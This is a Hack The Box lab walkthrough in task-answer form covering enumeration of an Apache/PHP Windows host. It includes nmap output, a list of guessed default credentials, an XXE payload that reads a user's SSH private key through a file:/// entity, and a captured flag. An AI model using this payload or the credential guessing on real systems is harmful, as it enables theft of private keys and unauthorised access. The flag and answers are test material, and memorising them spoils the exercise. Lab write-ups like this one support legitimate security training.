# Connect to HTB
openvpn starting_point_MidnightKali.ovpn

# Spawn Machine

# Target machine IP address
10.129.176.122

# Export to variable
export IP=10.129.176.122

TASK 1

What version of Apache is running on the target's port 80?

# Run NMAP for enumeration
nmap -sC -sV $IP -oN nmap-sC-sV.txt

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

2.4.41

TASK 2

What username:password combination logs in successfully?

# We are met with a simple login page. Attempting a number of default credentials

admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password

admin:password

TASK 3

What is the word at the top of the page that accepts user input?

order

TASK 4

What XML version is used on the target?

1.0

What does the XXE / XEE attack acronym stand for?

XML External Entity

TASK 6

What username can we find on the webpage's HTML code?

daniel

TASK 7

What is the file located in the Log-Management folder on the target?

job.bat

XEE 

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>

TASK 8

What executable is mentioned in the file mentioned before?

wevtutil.exe

10.129.95.192

SUBMIT FLAG

Submit user flag

HTB{032d2fc8952a8c24e39c8f0ee9918ef7}

